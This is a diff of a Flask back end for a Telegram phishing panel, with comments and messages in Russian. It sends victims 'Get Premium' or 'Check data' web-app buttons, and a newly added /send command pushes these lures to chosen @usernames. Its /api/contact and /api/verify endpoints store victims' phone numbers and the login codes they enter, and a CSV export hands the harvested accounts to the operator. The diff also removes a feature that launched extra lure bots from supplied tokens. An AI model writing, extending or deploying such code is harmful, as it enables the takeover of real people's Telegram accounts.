@@ -34,22 +34,12 @@ def init_db():
             created_at INTEGER
         )
     """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS bots (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            token TEXT,
-            name TEXT,
-            template TEXT,
-            created_at INTEGER
-        )
-    """)
     conn.commit()
     conn.close()
     logging.info("✅ База данных инициализирована")
 
 init_db()
 
-# ========== РАБОТА С БАЗОЙ ==========
 def get_all_accounts():
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
@@ -66,25 +56,6 @@ def get_accounts_count():
     conn.close()
     return count
 
-def save_bot_token(token, template, name="Новый бот"):
-    conn = sqlite3.connect("bot_panel.db")
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO bots (token, name, template, created_at) VALUES (?, ?, ?, ?)",
-        (token, name, template, int(datetime.now().timestamp()))
-    )
-    conn.commit()
-    conn.close()
-    logging.info(f"✅ Сохранён бот: {token} -> {template}")
-
-def get_bots():
-    conn = sqlite3.connect("bot_panel.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT token, name, template, created_at FROM bots ORDER BY created_at DESC")
-    rows = cursor.fetchall()
-    conn.close()
-    return rows
-
 # ========== ОТПРАВКА СООБЩЕНИЙ ==========
 def send_message(chat_id, text, reply_markup=None, parse_mode=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -99,34 +70,7 @@ def send_message(chat_id, text, reply_markup=None, parse_mode=None):
     except Exception as e:
         logging.error(f"❌ Ошибка отправки: {e}")
 
-# ========== ЗАПУСК НОВОГО БОТА ==========
-def run_bot(token, template):
-    """Запускает нового бота с выбранным шаблоном."""
-    try:
-        from telegram import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, Update
-        from telegram.ext import Application, CommandHandler
-    except ImportError:
-        logging.error("❌ python-telegram-bot не установлен")
-        return
-
-    url = MINI_APP_URL if template == "premium" else MINI_APP_URL2
-    text = "🎁 Получить Premium" if template == "premium" else "🔍 Проверить данные"
-
-    async def start(update: Update, context):
-        keyboard = [[
-            InlineKeyboardButton(text, web_app=WebAppInfo(url=url))
-        ]]
-        await update.message.reply_text(
-            f"Нажмите кнопку, чтобы получить доступ!",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
-
-    app_bot = Application.builder().token(token).build()
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.run_polling()
-    logging.info(f"✅ Бот запущен: {token} -> {template}")
-
-# ========== ОСНОВНОЙ ВЕБХУК (панель) ==========
+# ========== ОБРАБОТКА ВЕБХУКА ==========
 @app.route("/", methods=["POST"])
 def webhook():
     data = request.get_json()
@@ -141,9 +85,8 @@ def webhook():
         if text == "/start":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
-                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}],
-                    [{"text": "⚙️ Конфиг", "callback_data": "config"}]
+                    [{"text": "📤 Отправить кнопку", "callback_data": "send_button"}],
+                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                 ]
             }
             send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
@@ -154,90 +97,63 @@ def webhook():
                 return "OK", 200
             show_admin_panel(chat_id)
 
-        elif text.startswith("/start_bot"):
-            token = text.replace("/start_bot", "").strip()
-            if token:
-                save_bot_token(token, "premium")
-                threading.Thread(target=run_bot, args=(token, "premium")).start()
-                send_message(chat_id, f"✅ Бот запущен с шаблоном `premium`", parse_mode="Markdown")
+        elif text.startswith("/send"):
+            parts = text.split()
+            if len(parts) < 3:
+                send_message(chat_id, "❌ Формат: `/send @username premium` или `/send @username osint`", parse_mode="Markdown")
+                return "OK", 200
+            target = parts[1].strip()
+            if not target.startswith("@"):
+                target = "@" + target
+            button_type = parts[2].strip().lower()
+
+            if button_type == "premium":
+                url = MINI_APP_URL
+                label = "🎁 Получить Premium"
+            elif button_type == "osint":
+                url = MINI_APP_URL2
+                label = "🔍 Проверить данные"
+            else:
+                send_message(chat_id, "❌ Неверный тип. Используй `premium` или `osint`", parse_mode="Markdown")
+                return "OK", 200
+
+            keyboard = {
+                "inline_keyboard": [
+                    [{"text": label, "web_app": {"url": url}}]
+                ]
+            }
+            send_message(target, f"🎁 Вам отправили кнопку **{label}**!", reply_markup=keyboard, parse_mode="Markdown")
+            send_message(chat_id, f"✅ Кнопка `{label}` отправлена пользователю {target}", parse_mode="Markdown")
 
     elif "callback_query" in data:
         query = data["callback_query"]
         chat_id = query["message"]["chat"]["id"]
         data_callback = query.get("data")
 
-        if data_callback == "config":
+        if data_callback == "send_button":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "➕ Добавить бота", "callback_data": "add_bot"}],
-                    [{"text": "📋 Список ботов", "callback_data": "list_bots"}],
+                    [{"text": "🎁 Premium", "callback_data": "send_premium"}],
+                    [{"text": "🔍 Проверить данные", "callback_data": "send_osint"}],
                     [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                 ]
             }
-            send_message(chat_id, "⚙️ **Конфиг**\n\nУправление ботами:", reply_markup=keyboard, parse_mode="Markdown")
+            send_message(chat_id, "🔧 **Выберите тип кнопки для отправки:**", reply_markup=keyboard)
 
-        elif data_callback == "add_bot":
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🎁 Получить Premium", "callback_data": "add_bot_premium"}],
-                    [{"text": "🔍 Проверить данные", "callback_data": "add_bot_osint"}],
-                    [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
-                ]
-            }
-            send_message(chat_id, "🔧 **Выберите шаблон для нового бота:**", reply_markup=keyboard)
+        elif data_callback == "send_premium":
+            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username premium`", parse_mode="Markdown")
 
-        elif data_callback == "add_bot_premium":
-            send_message(chat_id, "Введите токен бота из @BotFather:\n`/start_bot ТОКЕН`", parse_mode="Markdown")
-
-        elif data_callback == "add_bot_osint":
-            send_message(chat_id, "Введите токен бота из @BotFather:\n`/start_bot ТОКЕН`", parse_mode="Markdown")
-
-        elif data_callback == "list_bots":
-            bots = get_bots()
-            if not bots:
-                send_message(chat_id, "📭 Нет добавленных ботов.")
-                return "OK", 200
-            msg = "📋 **Список ботов:**\n\n"
-            for i, (token, name, template, created_at) in enumerate(bots[:10], 1):
-                date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
-                msg += f"{i}. `{token}` | 🎭 {template} | 🕒 {date}\n"
-            send_message(chat_id, msg, parse_mode="Markdown")
+        elif data_callback == "send_osint":
+            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username osint`", parse_mode="Markdown")
 
         elif data_callback == "back_to_menu":
             keyboard = {
                 "inline_keyboard": [
-                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
-                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}],
-                    [{"text": "⚙️ Конфиг", "callback_data": "config"}]
+                    [{"text": "📤 Отправить кнопку", "callback_data": "send_button"}],
+                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                 ]
             }
             send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
-
-        elif data_callback == "create_button":
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🎁 Получить Premium", "callback_data": "create_robux"}],
-                    [{"text": "🔍 Проверить данные", "callback_data": "create_osint"}],
-                    [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
-                ]
-            }
-            send_message(chat_id, "🔧 **Выберите тип кнопки:**", reply_markup=keyboard)
-
-        elif data_callback == "create_robux":
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🎁 Получить Premium", "web_app": {"url": MINI_APP_URL}}]
-                ]
-            }
-            send_message(chat_id, "✅ Кнопка **Premium** создана! Перешлите это сообщение.", reply_markup=keyboard)
-
-        elif data_callback == "create_osint":
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🔍 Проверить данные", "web_app": {"url": MINI_APP_URL2}}]
-                ]
-            }
-            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Перешлите это сообщение.", reply_markup=keyboard)
 
         elif data_callback == "export_csv":
             rows = get_all_accounts()
@@ -257,28 +173,6 @@ def webhook():
                 logging.info("📤 CSV отправлен")
             except Exception as e:
                 logging.error(f"❌ Ошибка отправки CSV: {e}")
-
-    return "OK", 200
-
-# ========== КЛИЕНТСКИЙ ВЕБХУК (для @fikeikddbot) ==========
-@app.route("/client", methods=["POST"])
-def webhook_client():
-    data = request.get_json()
-    if not data:
-        return "OK", 200
-
-    if "message" in data:
-        msg = data["message"]
-        chat_id = msg["chat"]["id"]
-        text = msg.get("text", "")
-
-        if text == "/start":
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🎁 Получить Premium", "web_app": {"url": MINI_APP_URL}}]
-                ]
-            }
-            send_message(chat_id, "🎁 Нажмите кнопку, чтобы получить Premium!", reply_markup=keyboard)
 
     return "OK", 200
 
@@ -328,10 +222,8 @@ def api_contact():
     data = request.get_json()
     phone = data.get("phone")
     template = data.get("template", "premium")
-
     if not phone:
         return json.dumps({"status": "error", "message": "Номер обязателен"}), 400
-
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
     cursor.execute(
@@ -340,7 +232,6 @@ def api_contact():
     )
     conn.commit()
     conn.close()
-
     logging.info(f"📩 Получен номер: {phone}, шаблон: {template}")
     return json.dumps({"status": "code_sent", "message": "Код отправлен"})
 
@@ -350,10 +241,8 @@ def api_verify():
     phone = data.get("phone")
     code = data.get("code")
     template = data.get("template", "premium")
-
     if not phone or not code:
         return json.dumps({"status": "error", "message": "Телефон и код обязательны"}), 400
-
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
     cursor.execute(
@@ -362,7 +251,6 @@ def api_verify():
     )
     conn.commit()
     conn.close()
-
     logging.info(f"✅ Проверен код: {phone} → {code}")
     return json.dumps({"status": "success", "message": "Аккаунт подтверждён"})
 
